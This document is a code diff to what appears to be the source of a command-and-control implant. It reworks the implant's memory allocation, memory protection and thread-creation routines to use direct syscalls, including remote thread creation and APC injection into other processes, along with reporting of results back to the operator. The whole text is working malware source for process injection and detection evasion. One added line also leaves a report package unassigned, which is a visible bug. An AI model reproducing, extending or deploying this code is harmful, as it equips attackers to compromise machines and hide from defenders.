@@ -10,11 +10,15 @@ typedef ULONG NTSTATUS;
 
 LPVOID MemoryAlloc( DX_MEMORY MemMethode, HANDLE hProcess, SIZE_T MemSize, DWORD Protect )
 {
-    PPACKAGE Package  = PackageCreate( DEMON_INFO );
+    PPACKAGE Package  = NULL;
     PVOID    Memory   = NULL;
     NTSTATUS NtStatus = STATUS_SUCCESS;
 
-    PackageAddInt32( Package, DEMON_INFO_MEM_ALLOC );
+    if ( Instance.Config.Implant.Verbose ) {
+        Package = PackageCreate( DEMON_INFO );
+        PackageAddInt32( Package, DEMON_INFO_MEM_ALLOC );
+    }
+
     switch ( MemMethode )
     {
         case DX_MEM_DEFAULT:
@@ -41,7 +45,7 @@ LPVOID MemoryAlloc( DX_MEMORY MemMethode, HANDLE hProcess, SIZE_T MemSize, DWORD
         case DX_MEM_SYSCALL:
         {
             PRINTF( "NtAllocateVirtualMemory( %x, %p, %d, %p [%d], %d, %x ) => ", hProcess, &Memory, 0, &MemSize, MemSize, MEM_COMMIT | MEM_RESERVE, Protect );
-            NtStatus = Instance.Syscall.NtAllocateVirtualMemory( hProcess, &Memory, 0, &MemSize, MEM_COMMIT | MEM_RESERVE, Protect );
+            NtStatus = SysNtAllocateVirtualMemory( hProcess, &Memory, 0, &MemSize, MEM_COMMIT | MEM_RESERVE, Protect );
 #ifdef DEBUG
             printf( "%lx\n", NtStatus );
 #endif
@@ -63,72 +67,86 @@ LPVOID MemoryAlloc( DX_MEMORY MemMethode, HANDLE hProcess, SIZE_T MemSize, DWORD
         }
     }
 
-    if ( Memory && Instance.Config.Implant.Verbose )
-    {
-        PUTS( "Memory" )
-        PackageAddPtr( Package, Memory );
-        PackageAddInt32( Package, MemSize );
-        PackageAddInt32( Package, Protect );
-        PackageTransmit( Package, NULL, NULL );
+    if ( Memory ) {
+        if ( Instance.Config.Implant.Verbose ) {
+            PackageAddPtr( Package, Memory );
+            PackageAddInt32( Package, MemSize );
+            PackageAddInt32( Package, Protect );
+            PackageTransmit( Package, NULL, NULL );
+        }
+    } else {
+        PackageDestroy( Package );
     }
+
+    Package = NULL;
 
     return Memory;
 }
 
 BOOL MemoryProtect( DX_MEMORY MemMethode, HANDLE hProcess, LPVOID Memory, SIZE_T MemSize, DWORD Protect )
 {
-    PPACKAGE  Package    = PackageCreate( DEMON_INFO );
+    PPACKAGE  Package    = NULL;
     NTSTATUS  NtStatus   = STATUS_SUCCESS;
-    DWORD     OldProtect = 0;
+    ULONG     OldProtect = 0;
     BOOL      Success    = FALSE;
 
-    PackageAddInt32( Package, DEMON_INFO_MEM_PROTECT );
+    if ( Instance.Config.Implant.Verbose ) {
+        Package = PackageCreate( DEMON_INFO );
+        PackageAddInt32( Package, DEMON_INFO_MEM_PROTECT );
+    }
+
     switch ( MemMethode )
     {
-        case DX_MEM_WIN32:
-        {
+        case DX_MEM_WIN32: {
             Success = Instance.Win32.VirtualProtectEx( hProcess, Memory, MemSize, Protect, &OldProtect );
+            break;
         }
-        case DX_MEM_SYSCALL:
-        {
-            NtStatus = Instance.Syscall.NtProtectVirtualMemory( hProcess, &Memory, &MemSize, Protect, &OldProtect );
 
-            if ( ! NT_SUCCESS( NtStatus ) )
-            {
+        case DX_MEM_SYSCALL: {
+            if ( ! NT_SUCCESS( NtStatus = SysNtProtectVirtualMemory( hProcess, &Memory, &MemSize, Protect, &OldProtect ) ) ) {
                 NtSetLastError( Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
-                Success = FALSE;
-            }
-            else
+            } else {
                 Success = TRUE;
+            }
 
             break;
         }
-        default:
-        {
+
+        default: {
             Success = FALSE;
         }
     }
 
-    if ( Success && Instance.Config.Implant.Verbose )
-    {
-        PUTS( "Memory Protection" )
+    if ( Success && Instance.Config.Implant.Verbose ) {
         PackageAddPtr( Package, Memory );
         PackageAddInt32( Package, MemSize );
         PackageAddInt32( Package, OldProtect );
         PackageAddInt32( Package, Protect );
         PackageTransmit( Package, NULL, NULL );
+        Package = NULL;
     }
+
+    if ( Package ) {
+        PackageDestroy( Package );
+    }
+
+    Package = NULL;
 
     return Success;
 }
 
+/* TODO: move to Thread.c */
 BOOL ThreadCreate( DX_THREAD CreateThreadMethode, HANDLE hProcess, LPVOID EntryPoint, PINJECTION_CTX ctx )
 {
-    PPACKAGE Package  = PackageCreate( DEMON_INFO );
+    PPACKAGE Package  = NULL;
     NTSTATUS NtStatus = STATUS_SUCCESS;
     BOOL     Success  = FALSE;
 
-    PackageAddInt32( Package, DEMON_INFO_MEM_EXEC );
+    if ( Instance.Config.Implant.Verbose ) {
+        PackageCreate( DEMON_INFO );
+        PackageAddInt32( Package, DEMON_INFO_MEM_EXEC );
+    }
+
     switch ( CreateThreadMethode )
     {
         case DX_THREAD_DEFAULT:
@@ -165,7 +183,7 @@ BOOL ThreadCreate( DX_THREAD CreateThreadMethode, HANDLE hProcess, LPVOID EntryP
             ThreadAttr.Entry.pValue     = ( PULONG_PTR )&ClientId;
             ThreadAttr.Length           = sizeof( NT_PROC_THREAD_ATTRIBUTE_LIST );
 
-            NtStatus = Instance.Syscall.NtCreateThreadEx( &ctx->hThread, THREAD_ALL_ACCESS, NULL, hProcess, EntryPoint, ctx->Parameter, FALSE, 0, 0, 0, &ThreadAttr );
+            NtStatus = SysNtCreateThreadEx( &ctx->hThread, THREAD_ALL_ACCESS, NULL, hProcess, EntryPoint, ctx->Parameter, FALSE, 0, 0, 0, &ThreadAttr );
             if ( ! NT_SUCCESS( NtStatus ) )
             {
                 PUTS( "[-] NtCreateThreadEx: failed" )
@@ -194,7 +212,8 @@ BOOL ThreadCreate( DX_THREAD CreateThreadMethode, HANDLE hProcess, LPVOID EntryP
             if ( ! ctx->hThread )
             {
                 PUTS( "Search for random thread" )
-                // TODO: change to Syscall
+
+                /* TODO: use NtGetNextThread */
 
                 hSnapshot = Instance.Win32.CreateToolhelp32Snapshot( TH32CS_SNAPTHREAD, 0 );
                 bResult   = Instance.Win32.Thread32First( hSnapshot, &threadEntry );
@@ -217,38 +236,34 @@ BOOL ThreadCreate( DX_THREAD CreateThreadMethode, HANDLE hProcess, LPVOID EntryP
                             ProcClientID.UniqueProcess = ( HANDLE ) ( ULONG_PTR ) ctx->ProcessID;
                             ProcClientID.UniqueThread  = ( HANDLE ) ( ULONG_PTR ) threadId;
 
-                            Instance.Syscall.NtOpenThread( &ctx->hThread, MAXIMUM_ALLOWED, &ObjectAttributes, &ProcClientID );
+                            SysNtOpenThread( &ctx->hThread, MAXIMUM_ALLOWED, &ObjectAttributes, &ProcClientID );
 
                             break;
                         }
                     }
                 }
 
-                Instance.Win32.NtClose( hSnapshot );
+                SysNtClose( hSnapshot );
             }
 
-            if ( ctx->SuspendAwake )
-            {
-                NtStatus = Instance.Syscall.NtSuspendThread( ctx->hThread, NULL );
-                if ( ! NT_SUCCESS( NtStatus ) )
-                {
-                    PUTS( "[-] NtSuspendThread: Failed" )
+            if ( ctx->SuspendAwake ) {
+                if ( ! NT_SUCCESS( NtStatus = SysNtSuspendThread( ctx->hThread, NULL ) ) ) {
+                    PRINTF( "[-] NtSuspendThread: Failed => %p", NtStatus )
                     Success = FALSE;
                 }
             }
 
-            NtStatus = Instance.Syscall.NtQueueApcThread( ctx->hThread, EntryPoint, ctx->Parameter, NULL, NULL );
-            if ( ! NT_SUCCESS( NtStatus ) )
-            {
+            if ( ! NT_SUCCESS( NtStatus = SysNtQueueApcThread( ctx->hThread, EntryPoint, ctx->Parameter, NULL, NULL ) ) ) {
                 PUTS( "[-] NtQueueApcThread: Failed" )
                 Success = FALSE;
-            } else
+            } else {
                 Success = TRUE;
+            }
 
             // Alert the thread. trigger execution
             if ( ctx->SuspendAwake )
             {
-                NtStatus = Instance.Syscall.NtAlertResumeThread( ctx->hThread, NULL );
+                NtStatus = SysNtAlertResumeThread( ctx->hThread, NULL );
                 if ( ! NT_SUCCESS( NtStatus ) )
                 {
                     PUTS( "[-] NtAlertResumeThread: Failed" );
@@ -276,6 +291,7 @@ BOOL ThreadCreate( DX_THREAD CreateThreadMethode, HANDLE hProcess, LPVOID EntryP
             PackageAddPtr( Package, EntryPoint );
             PackageAddInt32( Package, ctx->ThreadID );
             PackageTransmit( Package, NULL, NULL );
+            Package = NULL;
         }
 
         // Only add to the job if it's running in the current process/implant.
@@ -286,6 +302,11 @@ BOOL ThreadCreate( DX_THREAD CreateThreadMethode, HANDLE hProcess, LPVOID EntryP
                 JobAdd( Instance.CurrentRequestID, ctx->ThreadID, JOB_TYPE_THREAD, JOB_STATE_RUNNING, ctx->hThread, NULL );
             }
         }
+    }
+
+    if ( Package ) {
+        PackageDestroy( Package );
+        Package = NULL;
     }
 
     return Success;
